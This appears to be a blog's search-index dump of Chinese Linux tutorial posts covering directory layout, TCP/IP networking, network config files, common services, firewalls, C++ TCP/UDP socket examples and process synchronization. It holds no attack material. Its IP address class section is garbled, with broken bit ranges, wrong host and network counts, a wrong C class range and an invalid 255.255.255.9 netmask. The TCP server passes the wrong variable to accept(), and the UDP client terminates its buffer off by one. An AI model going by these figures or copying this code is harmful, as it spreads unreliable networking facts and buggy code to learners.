&#x2F;etc&#x2F;fstab 的定义。 &#x2F;opt 可选的应用程序包。 &#x2F;proc 操作系统运行时，进程（正在运行中的程序）信息及内核信息（比如 cpu、硬盘分区、内存信息等）存放在这里。&#x2F;proc 目录伪装的文件系统 proc 的挂载目录，proc 并不是真正的文件系统，它的定义可以参见 &#x2F;etc&#x2F;fstab 。 &#x2F;root Root 用户的工作目录 &#x2F;sbin 和 bin 类似，是一些可执行文件，不过不是所有用户都需要的，一般是系统管理所需要使用得到的。 &#x2F;tmp 系统的临时文件，一般系统重启不会被保存。 &#x2F;usr 包含了系统用户工具和程序。&#x2F;usr&#x2F;bin：非必须的普通用户可执行命令；&#x2F;usr&#x2F;include：标准头文件； &#x2F;usr&#x2F;lib:&#x2F;usr&#x2F;bin&#x2F; 和 &#x2F;usr&#x2F;sbin&#x2F;的库文件； &#x2F;usr&#x2F;sbin:非必须的可执行文件；&#x2F;usr&#x2F;src:内核源码；&#x2F;usr&#x2F;X11R6:X Window System, Version 11, Release 6. &#x2F;srv 该目录存放一些服务启动之后需要提取的数据","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux操作系统原理剖析","slug":"A-OS/Linux/Linux操作系统原理剖析","permalink":"http://example.com/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"【原理剖析】d-Linux 网络基础.md","date":"2023-12-26T16:00:00.000Z","path":"A_OS/Linux/Linux操作系统原理剖析/d-Linux 网络基础/","text":"概述：Linux 操作系统实际上是一个网络操作系统，系统管理的很大部分工作其实都和网络有关。 TCP&#x2F;IP 协议 Linux 网络配置 基本网络服务 网络安全 Linux 下网络通信基本流程和操作 0x01 TCP&#x2F;IP 协议在信息化设备中，及刷机已经从单一使用发展到了集群使用。越来越多的应用领域需要计算机在一定的地理范围内联合起来进行集群工作，从而促进了计算机和通信技术的紧密结合，形成了计算机网络。 在计算机网络中，为了实现计算机之间的相互通信，有许多不同的通信规程和约定，这些规程和约定就是计算机网络协议。这就要求不同的计算机厂商在开发和研制自己的网络系统时需要遵循一个统一的约定。网络标准化组织在 1981 年颁布了开放系统互联参考模型，即 ISO&#x2F;OSI 模型，如下图所示，现在大部分网络协议都是参考这标准设计的。 TCP&#x2F;IP 于 20 世纪 70 年代开始研究和开发，现在也广泛用于各种网络中，不论是局域网还是广域网都可以用 TCP&#x2F;IP 协议来构造网络环境。同时 TCP&#x2F;IP 协议也是 Unix、Linux 等操作系统中最重要的网络协议。以 TCP&#x2F;IP 为核心协议的 Internet 更加促进了 TCP&#x2F;IP 的应用和发展。 从体系结构上来看， TCP&#x2F;IP 协议是 OSI 参考模型七层结构的简化，它只有应用层、传输层、网际层和网络接口层。其中： TCP&#x2F;IP 网络接口层对应于 OSI 参考模型的物理层和数据链路层； TCP&#x2F;IP 网际层对应于 OSI 参考模型的网络层； TCP&#x2F;IP 传输层包含 TCP、UDP 两个协议，对应于 OSI 参考模型的传输层； TCP&#x2F;IP 应用层包含了 OSI 参考模型的会话层、表示层、应用层； TCP&#x2F;IP 协议是由一组通信协议组成的协议簇，其核心部分包括传输层协议（TCP 和 UDP）、网络层协议（IP）和网络接口层，这三层部分的协议内容都在操作系统内核中实现。而应用层协议，如 FTP、HTTP 等协议都是通过网络编程接口与核心协议打交道，整个协议簇是一种分层结构，下层为上层服务，不同层次之间通过一些接口通信。 以太网 1980 年 9 月由美国 Xerox、Intel、DEC 公司合作第一次公布了 Ethernet 的物理层和数据链路层的技术规范，成为世界上第一个局域网工业标准。IEEE 802.3 国际标准是在 Ethernet 标准的基础上制定的。 以太网工作起来就像一个总线系统，每一台机器都通过一个分接器挂在一根很长的电缆上。为了让机器识别到自己生，每块以太网卡都有一个由制造商唯一分配的地址 MAC 地址。当一块以太网卡想要同另一块以太网卡对话时，它将向整个以太网电缆发送信息，其中包括自己的 MAC 地址和接收者的 MAC 地址。两块以太网卡试图在同一时间发送数据时，便会产生冲突。解决这种冲突的办法就是两台计算机取消这次发送各自等待一段随机时间再发送数据的尝试。 允许 Linux 和 TCP&#x2F;IP 在以太网地址和 IP 地址间进行连接的是地址解析协议（ARP）缓存。当一台 Linux 机器开始在以太网上发消息时，它会通过 ARP 询问子网上其他机器的 MAC 地址。 IP 协议 IP 协议位于 TCP&#x2F;IP 协议簇的第三层，是 TCP&#x2F;IP 协议的传输系统，也是整个 TCP&#x2F;IP 协议簇的核心。 IP 协议负责数据报在计算机之间的寻址，决定数据传送到哪里以及出现网络故障时如何更换路由。IP 不保证传送的可靠性，在主机资源不足的情况下，它可能丢弃某些数据包，同时 IP 也不会检查数据链路层丢弃的报文。 1）IP 地址。TCP&#x2F;IP 网络要进行通信，每一台主机都要预先分配一个唯一的 32 位地址作为该主机的标识符，这个主机必须使用该地址进行所有通信活动，这个地址也称为 IP 地址。IP 地址通常由网络标识 ID 和主机标识两部分组成，可以标识互联网络中任何一个网络中的任何主机。网络标识也称为网络地址，用于辨别子网，同一子网上的所有 TCP&#x2F;IP 主机的网络 ID 都相同。主机标识也称为主机地址，用于辨别每一个网络中的主机。IP 地址格式如下图所示： 其中，网络 ID 是大于 1 位的二进制数，主机 ID 也是大于 1 位的二进制数。如计算中心网关地址 132.111.002.001 分解成协议所认识的地址就是：网络 ID（132.111）和主机 ID（002.001） IP 地址分类如下： A 类地址：网络类别字段占 1 位，即第 0 位为 0，表示是 A 类地址，第 17 位表示网络地址，第 831 位表示主机地址。它所表示的范围为 0.0.0.0~127.255.255.255，即能够表示 126 个网络地址，16387064 个主机地址。A 类地址通常用于超大型网络场合。 B 类地址：网络类别字段占 2 位，即第 0、1 位为 1 0 ，表示 B 类地址，第 215 位表示网络地址，第 1631 位表示主机地址，它所能表示的范围为 128.0.0.0~191.255.255.255，即能够表示 16256 个网络地址，64576 个主机地址。B 类地址通常用于大型网络的场合。 C 类地址：网络类别字段占 3 位，即第 0、1、2 位为 110 ，表示 C 类地址，第 323 位表示网络地址，第 2431 位表示主机地址。它所能表示的范围 192.0.0.0~192.233.255.255，即能够表示 2064512 个网络地址，254 个主机地址。C 类地址通常用于校园网或企业网。 此外，还有 D 类和 E 类 IP 地址。 D 类地址用于多址广播地址，供特殊协议向选定的节点发送信息用。E 类地址暂时保留。 2）子网掩码。通常将一个较大网络分为多个较小的网络，每个小网络使用不同的网络 ID ，这样的小网络称为子网。 在网络通信时，若想要找到子网，需要定义子网掩码。子网掩码与 IP 地址一样也是一个 32 位的值，将它与主机的 IP 地址做按位 “与” 运算，可以屏蔽一部分 IP 地址，从而确定出这个网络地址。子网掩码可概括两个功能：用于区分网络地址和主机地址；用于将网络分割为多个子网。 TCP 协议 TCP 协议是一种面向连接的、可靠的传输层协议。面向连接是指一次正常的 TCP 传输需要通过在 TCP 客户端和 TCP 服务端之间建立特定的虚电路连接来完成，这个过程通常称为“三次握手”，可靠的传输协议可避免数据传输错误。TCP 协议可以支持许多高层协议，它对高层协议的数据结构没有任何要求，对于 TCP 来说只是将这些传输的数据结构作为一种连续的数据流。 UDP 协议 UDP 协议也是常用的传输层协议，提供非面向连接的、不可靠的数据流传输服务。这种服务不确定报文是否到达，不对报文排序，也不进行流量控制，因此 UDP 报文可能出现丢失、重复和失序等现象。与 TCP 相同的特点，UDP 协议也可以通过端口号支持多路复用功能。UDP 是一种简单的协议机制，通信开销小，效率高，适合对于可靠性要求不高当需要快捷、低延迟通信的应用场合。 0x02 配置Linux网络在 Linux 系统中，TCP&#x2F;IP 网络是通过若干文本文件进行配置的，通过了解和修改这些配置文件就能够完成 Linux 联网功能。下面将逐个介绍 Linux 网络配置相关的文件。 &#x2F;etc&#x2F;HOSTNAME 文件 该文件包含系统的主机名称和完全的域名，如：linux.cic.tsinghua.edu.cn（Linux 为主机名，cic.tsinghua.edu.cn 为域名） &#x2F;etc&#x2F;host.conf 文件 该文件指定如何解析主机名。Linux 通过解析器库获得主机名对应的 IP 地址，内容如下： 123order bind,hosts # 指定主机名查询顺序，这里优先使用 DNS 解析域名，然后查询 /etc/hosts 文件multi on # 表示 /etc/hosts 文件中指定的主机可以有多个地址nospoof on # 指不允许对该服务器进行 IP 欺骗 &#x2F;etc&#x2F;services 文件 &#x2F;etc&#x2F;services 文件中包含了服务名和端口号之间的映射，不少系统程序要使用这个文件，内容如下： 123456tcpmux 1/tcp #TCP port service multiplexerecho 7/tcpecho 7/udpdiscard 9/tcp sink nulldiscard 9/udp sink nullsystatll/tcp users &#x2F;etc&#x2F;sysconfig&#x2F;network 文件 该文件用来指定服务器上的网络配置信息，包含控制与网络有关的文件和守护程序行为的参数，例如： 123456NETWORKING=yes #网络是否被配置HOSTNAME=machine1DOMAINNAME=cic.tsinghua.edu.cn # 分配给机器的域名GATEWAY=210.34.6.2 #网关的 IP 地址FORWARD_IPV4=yes #是否开启 IP 转发功能GATEWAYDEV=eth0 #gw-dev表示网关的设备名 &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ethN 文件 1234567DEVICE=&quot;eth0&quot;IPADDR=&quot;192.168.2.1&quot;NETMASK=&quot;255.255.255.9&quot;NETWORK=&quot;192.168.2.0&quot;BROADCAST=&quot;192.168.2.255&quot;ONBOOT=&quot;yes&quot;BOOTPROTO=&quot;none&quot; &#x2F;etc&#x2F;hosts 文件 &#x2F;etc&#x2F;hosts 文件包含了 IP 地址和主机名之间的映射，还包括主机名的别名。IP 地址的设计使计算机容易识别，但却很难记住它们，为了解决这个问题，创建了 &#x2F;etc&#x2F;hosts 文件，内容如下： 123127.0.0.1 machanel localhost.localdomain localhost192.168.1.100 machine7192.168.1.101 otherpc otheralias &#x2F;etc&#x2F;resolv.conf 文件 该文件是由 DNS 客户端解析器（resolver 一个根据主机名解析 IP 地址的库）使用的配置文件，它包含主机的域名搜索顺序和 DNS 服务器的地址。示例如下： 123search cic.tsinghua.edu.cnnameserver 166.111.4.5nameserver 166.111.8.28 &#x2F;etc&#x2F;init.d&#x2F;network 主机地址、子网掩码和网关 这个文件声明了 IP 地址、掩码、网络、广播地址和默认路由器的变量。示例如下： 12345IPADDR=192.168.1.100NETMASK=255.255.255.0NETWORK=192.168.1.0BROADCAST=192.168.1.255GATEWAY=192.168.1.1 0x03 域名服务器DNS连接 TCP&#x2F;IP 的每个网络接口用一个唯一的 32 位的 IP 地址标识，但由于数字比较复杂，难以记忆，而且没有形象性，因而发明了域名系统，在这种情况下，可以使用易于理解和较为形象的名称作为一台计算机的标识。大多数情况下，数字地址和域名地址可以交替使用，但无论用数字地址或是域名进行网络应用时，总是以 IP 地址为基础进行的。在网络进行连接前，系统必须将域名地址转换成 IP 地址，这就是 DNS 的任务。 大多数 DNS 服务器都使用 Bind。DNS 提供了从名字到 IP 地址的映射关系，这种映射关系不必是一一映射，一个 IP 可以有多个域名，一个域名也可以对应多个 IP。 0x04 Apache 服务器Web 服务器是互联网上人马使用最多的一种服务器，它已经成了当今社会不可缺少的一种信息传播方式。目前市场上最流行的运行于 Linux 上的 Web 服务器是 Apache 服务器。 纵观 Apache，它为网络管理员提供了丰富多彩的功能，包括目录索引、目录别名、内容协商、可配置的 HTTP 错误报告、CGI 程序的 SetUID 执行、子进程资源管理、服务器端图像映射、重写 URL、URL 拼写检查以及联机手册 man 等。 0x05 邮件服务器自从加州大学伯克利分校 U.C Berkeley 完成 sendmail 的最初版本以来，sendmail 受到了业界长久的重视，从 1983 年的 V5 版本一直到 1993 年改写的 V8 版本，都受到了人们的尊重。 sendmail 为 Linux 提供 SMTP 连接所需的服务，它对邮件信息进行分析并把它传送到目的地。sendmail 采用开放源代码的开发方式编写，其所需源码都可以免费得到并自由发布。它只提供了邮件路由功能，将发送留给管理员可以选择的本地代理。 0x06 samba 服务器可以把 samba 当成是一个局域网络上的 file&#x2F;printer sever，它可以提供文件系统、打印机或其他信息，并与 samba sever 在同一个子网域的 samba client 共享。 samba 是用来实现 SMB 的一种软件，它的工作原理是让 NETBIOS 和 SMB 这两个协议运行于 TCP&#x2F;IP 通信协议之上，并使用 NETBEUI 协议让 Linux 计算机可以在网络上被其他计算机看到。所以，通过 samba 能够使得 不同系统的计算机可以在网络上进行沟通和共享文件。 0x07 Linux系统的文件安全Linux 文件系统是由文件和目录组成的树形结构，每个文件目录包括文件类型、文件的存取权限、文件名、文件所有者、文件大小、文件建立及修改的日期等内容。任何一项内容遭受未授权的修改，文件的安全性都将遭受到破坏。保护文件系统的安全性应该从以下几个方面入手： 文件存取权限的设置：文件属性决定了文件的被访问权限。 设置用户 ID 和同组用户 ID 许可：用户 ID 许可设置和同组用户 ID 许可设置只给予可执行的目标文件。 0x08 用户口令安全每个 Linux 的用户都拥有一个账号，通过登录到这个账号才能有限制地使用系统，而保护自身文件安全的唯一屏障就是口令，一旦这道屏障被破坏，整个系统的安全便无法得到保证。 Linux 系统中的 /etc/passwd 文件包含了全部系统需要知道的关于每个用户的信息。 0x09 防火墙技术 防火墙的概念 防火墙是一个矛盾统一体，它既要限制信息的流通，又要保持信息的流通。因此，根据网络安全性总体需求，防火墙可以遵循以下两种基本原则之一实现： 一切未被允许的都是禁止的 一切未被禁止的都是允许的 由于以上两种防火墙原则在安全性和可使用性上各有侧重，很多防火墙系统唉两者之间都采用了一定的折中。 防火墙的分类 根据不同的防范方式和侧重点，防火墙主要分为分组过滤型和代理服务型。它们在网络性能、安全性和应用透明性等方面各有利弊。 1）分组过滤型防火墙。分组过滤型防火墙只是根据数据包的内容来判断是否允许数据包的传输。通常在网路层上通过对分组中的 IP 地址、TCP&#x2F;UDP 端口号以及协议状态等字段的检查来决定是否转发一个分组。 分组过滤型防火墙的基本原理： 根据网络安全策略，在防火墙中事先设置分组过滤规则 根据分组过滤规则，对经过防火墙的分组流进行检查 分组过滤规则一定要按顺序排列。当一个分组到达时，按规则的排列顺序依次运用每个规则对分组进行检查。一旦分组与一个规则相匹配，则不再向下检查其他规则 如果一个分组与一个拒绝转发的规则相匹配，则该分组将被禁止通过 如果一个分组与一个允许转发的规则相匹配，则该分组将被允许通过 如果一个分组不与任何规则相匹配，则该分组将被禁止通过，这是遵循 “一切未被允许的都是禁止的”原则 0x0a Linux 常用网络命令介绍计算机网络的主要优点是能够实现资源和信息的共享，并且用户可以远程访问信息，Linux 提供了一组强有力的网络命令来为用户服务，这些工具能够帮助用户登录到远程计算机上，传输文件和执行远程命令等。 ftp 命令 ftp 命令是标准文件传输协议的用户接口。能够运行用户传输 ASCII 文件和二进制文件。 telnet 命令 用户使用 telnet 命令进行远程登陆。该命令运行用户使用 telnet 协议在远程计算机之间进行通信，用户可以通过网络在远程计算机上登录，就像登录到本地机器上执行命令一样。如下图所示： rlogin 命令 rlogin 是 remote login 的缩写。该命令与 telnet 命令类似，允许用户启动远程系统上的交互命令会话。如下图所示： rsh 命令 rsh 是 remote shell 的缩写。该命令在指定的远程主机上启动了一个 shell ，并执行用户在 rsh 命令行中指定的命令。如果用户没有给出要执行的命令，rsh 就用 rlogin 命令使用户登录到远程机上。 rcp 命令 rcp 其实就通常使用的 scp 命令，是 remote file copy 的缩写。该命令用于在计算机之间复制文件。 0x0b Linux 下 TCP 通信实例服务端123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/socket.h&gt;//出错调用函数void error_handle(std::string opt, std::string message)&#123; //根据errno值获取失败原因并打印到终端 perror(opt.c_str()); std::cout &lt;&lt; message &lt;&lt; std::endl; exit(1);&#125;int main(int argc, char *argv[])&#123; int serv_sock; int client_sock; struct sockaddr_in serv_addr; struct sockaddr_in client_addr; socklen_t client_addr_size; char message[] = &quot;hello world&quot;; //判断参数数量，Usage: &lt;port&gt;， 需要在命令行输入服务器接收消息的端口号 if(argc &lt; 2) &#123; std::cout &lt;&lt; &quot;Usage : &quot; &lt;&lt; argv[0] &lt;&lt; &quot; &lt;prot&gt;&quot; &lt;&lt; std::endl; exit(1); &#125; //创建socket 套接字 serv_sock = socket(PF_INET, SOCK_STREAM, 0); if(serv_sock &lt; 0) &#123; error_handle(&quot;socket&quot;, &quot;socket() error.&quot;); &#125; //初始化套接字结构体 memset(&amp;serv_addr, 0, sizeof(serv_addr)); serv_addr.sin_family = AF_INET; serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);//选择当前任意网卡 serv_addr.sin_port = htons(atoi(argv[1]));//设置接收消息的端口号 //绑定端口 if(bind(serv_sock, (struct sockaddr*)&amp;serv_addr, sizeof(serv_addr)) &lt; 0) &#123; error_handle(&quot;bind&quot;, &quot;bind() error.&quot;); &#125; //监听端口，设置等待队列数量为5 if(listen(serv_sock, 5) &lt; 0) &#123; error_handle(&quot;listen&quot;, &quot;listen() error.&quot;); &#125; //打印输出等待连接 std::cout &lt;&lt; &quot;Waiting Client....&quot; &lt;&lt; std::endl; client_addr_size = sizeof(client_addr); //等待接收客户端建立连接 client_sock = accept(serv_sock, (struct sockaddr*)&amp;client_sock, &amp;client_addr_size); if(client_sock &lt; 0) &#123; error_handle(&quot;accept&quot;, &quot;accept() error.&quot;); &#125; //accept() 成功建立连接后，服务器就会得到客户端的 IP 地址和端口号。 //打印客户端 IP 和端口号 std::cout &lt;&lt; &quot;Client IP : &quot; &lt;&lt; inet_ntoa(client_addr.sin_addr) &lt;&lt; &quot; , port : &quot; &lt;&lt; ntohs(client_addr.sin_port) &lt;&lt; std::endl; //向客户端发送 &quot;hello world&quot; 消息，使用write 标准IO接口就可以 write(client_sock, message, sizeof(message)); //关闭TCP连接 close(client_sock); //关闭socket套接字 close(serv_sock); return 0;&#125; 客户端12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/socket.h&gt;//出错调用函数void error_handle(std::string opt, std::string message)&#123; //根据errno值获取失败原因并打印到终端 perror(opt.c_str()); std::cout &lt;&lt; message &lt;&lt; std::endl; exit(1);&#125;int main(int argc, char *argv[])&#123; int sock;//socket套接字 struct sockaddr_in serv_addr;//服务器套接字结构体 char message[64];//用于接收服务器消息的缓冲区 int str_len; //判断当前参数数量，需要命令行参数 &lt;IP&gt; &lt;port&gt; if(argc &lt; 3) &#123; std::cout &lt;&lt; &quot;Usage : &quot; &lt;&lt; argv[0] &lt;&lt; &quot; &lt;IP&gt; &lt;port&gt;&quot; &lt;&lt; std::endl; exit(1); &#125; //创建socket 套接字 sock = socket(PF_INET, SOCK_STREAM, 0); if(sock &lt; 0) &#123; error_handle(&quot;socket&quot;, &quot;socket() error.&quot;); &#125; //初始化服务器套接字结构体参数，设置对方的IP地址和端口号 memset(&amp;serv_addr, 0, sizeof(serv_addr)); serv_addr.sin_family = AF_INET; serv_addr.sin_addr.s_addr = inet_addr(argv[1]); serv_addr.sin_port = htons(atoi(argv[2])); //与服务器建立连接 if(connect(sock, (struct sockaddr*)&amp;serv_addr, sizeof(serv_addr)) &lt; 0) &#123; error_handle(&quot;connect&quot;, &quot;connect() error.&quot;); &#125; //读取服务器发送来的消息 str_len = read(sock, message, sizeof(message) -1); if(str_len &lt; 0) &#123; //read() 读取数据失败 error_handle(&quot;read&quot;, &quot;read() error.&quot;); &#125; //将读取到的输出打印出来 std::cout &lt;&lt; &quot;Recv Message : &quot; &lt;&lt; message &lt;&lt; std::endl; //关闭socket 套接字 close(sock); return 0;&#125; 0x0c Linux 下 UDP 通信实例服务端12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/socket.h&gt;#define BUF_SIZE 128//出错调用函数void error_handle(std::string opt, std::string message)&#123; //根据errno值获取失败原因并打印到终端 perror(opt.c_str()); std::cout &lt;&lt; message &lt;&lt; std::endl; exit(1);&#125;int main(int argc, char *argv[])&#123; int serv_sock; char message[BUF_SIZE]; int str_len; socklen_t client_adr_sz; struct sockaddr_in serv_adr, client_adr; //因为服务器程序使用时通过命令行参数指定接收消息的端口号， //所以当参数数量少于需求 2 时，程序结束并报错 if(argc != 2)&#123; std::cout &lt;&lt; &quot;Usage : &quot; &lt;&lt; argv[0] &lt;&lt; &quot; &lt;port&gt;&quot; &lt;&lt; std::endl; exit(0); &#125; //创建socket 套接字，sock 用于后面发送和接收数据 serv_sock = socket(PF_INET, SOCK_DGRAM, 0); if(serv_sock == -1) &#123; error_handle(&quot;socket&quot;, &quot;UDP socket creation error.&quot;); &#125; //初始化套接字结构体，初始化服务器套接字结构体中的 IP 地址和端口号 memset(&amp;serv_adr, 0, sizeof(serv_adr)); serv_adr.sin_family = AF_INET; serv_adr.sin_addr.s_addr = htonl(INADDR_ANY); serv_adr.sin_port = htons(atoi(argv[1])); //将socket套接字绑定固定端口进行消息接收 if(bind(serv_sock, (struct sockaddr*)&amp;serv_adr, sizeof(serv_adr)) == -1) &#123; error_handle(&quot;bind&quot;, &quot;bind() error.&quot;); &#125; //UDP 方式不需要进行 listen 和 accept 操作，直接就可以通过 recvfrom 函数去接收套接字中收到的数据。 while(1) &#123; //清空接收消息数据的缓存区 memset(message, 0, BUF_SIZE); //计算客户端结构体大小，用于接收客户端数据结构 client_adr_sz = sizeof(client_adr); //recvfrom() 调用不仅收到对方发送来的数据，还通过最后两个参数返回了对方的 IP 地址和端口号信息，用于返回数据使用。 str_len = recvfrom(serv_sock, message, BUF_SIZE, 0, (struct sockaddr*)&amp;client_adr, &amp;client_adr_sz); //将收到的信息打印出来 std::cout &lt;&lt; &quot;Recv Message : &quot; &lt;&lt; message &lt;&lt; std::endl; //通过recvfrom 返回的发送方的IP地址和端口号信息，使用 sendto 将收到的信息再次发送回去。 sendto(serv_sock, message, str_len, 0, (struct sockaddr*)&amp;client_adr, client_adr_sz); &#125; //结束程序后关闭socket套接字 close(serv_sock); return 0;&#125; 客户端123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/socket.h&gt;#define BUF_SIZE 128//出错调用函数void error_handle(std::string opt, std::string message)&#123; //根据errno值获取失败原因并打印到终端 perror(opt.c_str()); std::cout &lt;&lt; message &lt;&lt; std::endl; exit(1);&#125;int main(int argc, char *argv[])&#123; int sock; char message[BUF_SIZE]; int str_len; socklen_t adr_sz; struct sockaddr_in serv_adr, from_adr; //因为客户端程序使用时通过命令行参数指定IP地址和端口号， //所以当参数数量少于需求 3 时，程序结束并报错 if(argc &lt; 3) &#123; std::cout &lt;&lt; &quot;Usage : &quot; &lt;&lt; argv[0] &lt;&lt; &quot; &lt;IP&gt; &lt;port&gt;&quot; &lt;&lt; std::endl; exit(0); &#125; //创建socket 套接字，sock 用于后面发送和接收数据 sock = socket(PF_INET, SOCK_DGRAM, 0); if(sock &lt; 0) &#123; error_handle(&quot;socket&quot;, &quot;socket() error.&quot;); &#125; //初始化套接字结构体，初始化服务器套接字结构体中的 IP 地址和端口号 memset(&amp;serv_adr, 0, sizeof(serv_adr)); serv_adr.sin_family = AF_INET; serv_adr.sin_addr.s_addr = inet_addr(argv[1]); serv_adr.sin_port = htons(atoi(argv[2])); while(1) &#123; //从标准输入获取发送数据，保存到message缓存区 std::cin &gt;&gt; message; //判断如果输入是 &#x27;q&#x27; 或者 &#x27;Q&#x27; 则表示退出客户端程序 if(!strcmp(message, &quot;q\\n&quot;) || !strcmp(message, &quot;Q\\n&quot;)) &#123; //退出 break; &#125; //发送消息 sendto(sock, message, strlen(message), 0, (struct sockaddr*)&amp;serv_adr, sizeof(serv_adr)); //清空接收数组 memset(message, 0, BUF_SIZE); //计算返回套接字结构体字节长度 adr_sz = sizeof(from_adr); //接收UDP返回数据 str_len = recvfrom(sock, message, BUF_SIZE, 0, (struct sockaddr*)&amp;from_adr, &amp;adr_sz); //在接收数据尾部添加&#x27;0&#x27;结束符 message[str_len + 1] = 0; //将接收数据打印输出 std::cout &lt;&lt; &quot;Recv Message : &quot; &lt;&lt; message &lt;&lt; std::endl; &#125;&#125;","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux操作系统原理剖析","slug":"A-OS/Linux/Linux操作系统原理剖析","permalink":"http://example.com/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"【原理剖析】3-操作系统进程控制及进程间通信概述","date":"2023-12-25T16:00:00.000Z","path":"A_OS/Linux/Linux操作系统原理剖析/3-操作系统进程控制及进程间通信概述/","text":"概述：知识点 Linux 临界资源概述 Linux 进程同步与互斥 Linux 进程间通信概述 Linux 进程间通信之管道方式 0x01 临界资源两个以上的进程不能同时使用的资源称为临界资源。临界资源可能是一些独占设备，例如：打印机、播放器、摄像头等等硬件设备；也可能是一块共享内存、表格文件、链表等软件资源。 举例说明：假设有一个火车订票系统有两个终端程序在运行 T1 和 T2 ，如果不对临界资源进行特殊管理，则很可能出现 T1 和 T2 同时获取到同一张票的信息卖给了不同的乘客，然后车票余量还只减少了一张。出现这样的情况就是因为 T1 和 T2 在访问订票系统的临界资源时没用进行限制使用导致的。 0x02 临界区不论是硬件资源还是软件资源，多个进程必须互斥访问而不能同时访问，一旦同时访问就会出现问题。每个进程中访问临界资源的那段代码称为临界区。所以，如果能够保证各个进程在进入各自临界区是互斥的，那么就可以实现各个进程对临界资源的访问是互斥的。因此，每个进程在进入临界区之前，应该先对欲访问的临界资源进行检查，检查当前临界资源是否有进程在进行访问，如果当前存在进程访问（即占用临界资源），则当前该进程不能进入临界区；如果此刻没有其他进程正在访问和使用临界资源，则当前进程可以进入临界区对临界资源进行访问和使用，并设置正在访问标识来告诉其他进程此时临界资源正在被使用。（这样的操作就类似火车上的男女共用的单独卫生间，当有人在使用时，红灯亮起告诉所有人正在使用，当无人使用时绿灯亮起，表示当前所有人都可以进入） 进程在进入临界区前需要检查临界资源使用情况，能够访问临界资源后需要设置正在访问标识。在经常访问资源完成后退出临界资源的访问后，需要将访问标识恢复原样，这部分的代码称为退出区。进程中除了进入区、退出区、临界区，其余部分的代码称为剩余区，于是一个访问临界资源的进程可以被封为如下部分组成： 1234进入区临界区退出区剩余区 0x03 进程的互斥与同步 进程互斥 进程互斥是指多个进程不能同时使用同一个临界资源，即两个或两个以上进程必须互斥地使用临界资源或者不能同时进入临界区。这是由于各个进程共享某些资源引起的。 进程同步 进程同步是指有协作关系的进程之间不断地调整它们之间的相对执行过程，以保证临界资源在不同进程中执行的顺序和合理利用。 0x04 Linux实现进程互斥和同步机制Linux 操作系统下对于进程的互斥和同步控制主要有以下这三种方式： 锁机制 信号量机制 xxxxxxxxxx16 1#include &lt;sys&#x2F;types.h&gt;2#include &lt;sys&#x2F;ipc.h&gt;3#include &lt;sys&#x2F;msg.h&gt;4​5int msgctl(int msgqid, int cmd, struct msgid_ds *buf)6&#x2F;7参数：8- msqid 消息队列的队列 ID9- cmd 执行操作，如下：10 - IPC_STAT：读取消息队列的数据结构 msgid_ds ，并将其存储到 buf 位置11 - IPD_SET：设置消息队列的数据结构 msgid_ds 中的 ipc_perm 值，这个值取自 buf 参数12 - IPC_RMID：从系统内核中删除消息队列13- buf：描述消息队列的 msqid_ds 结构类型的变量14返回值15 成功返回 0， 失败返回 -116&#x2F;C 0x05 锁机制Linux 锁机制其实就是一种实现互斥的软件方式，即提供一对进程共享的锁变量，在进入临界区之前首先测试锁变量的状态，通过锁的状态了解到临界资源是否被占用。临界资源可用，则设置锁变量；临界资源被占用，则会根据锁的不同选择睡眠等待、自旋等待或者返回资源占用状态等。主要操作流程演示如下： 1234567#加锁Lock w:&#123; 访问临界资源&#125;#访问完毕，开锁UnLock w; 0x06 信号量机制在早先提出的一种广义锁机制或称为计数锁的同步机制，既能解决互斥又能解决同步，是一种非常有效的同步工具，后来加以改进形成了信号量同步机制。 申请和释放临界资源的方式通过 wait() 操作和 signal() 操作完成，有时候也称为 P 操作（荷兰语 Passeren 首字母）和 V 操作（Verhoong 的首字母）。 信号量也被叫做信号灯，是在信号量同步机制中用于实现进程的同步和互斥的有效数据结构。我们可以为每一类资源设置一个信号量，信号量有很多种类型的数据结构，如整型信号量、记录型信号量、AND 型信号量以及信号量集等。 整型信号量整型信号量是信号量中最简单的类型，也是各种信号量类型中必须包含的类型。整型信号量的数值表示当前系统中可用的该类临界资源的数量。 如设置了整型信号量 s ，则 s 值的意义为： s&gt;0 ，表示系统中空闲的该类临界资源的个数； s=0 ，表示系统中该类临界资源干好全部被占用，而且没有进程在等待临界资源； s&lt;0 ，s 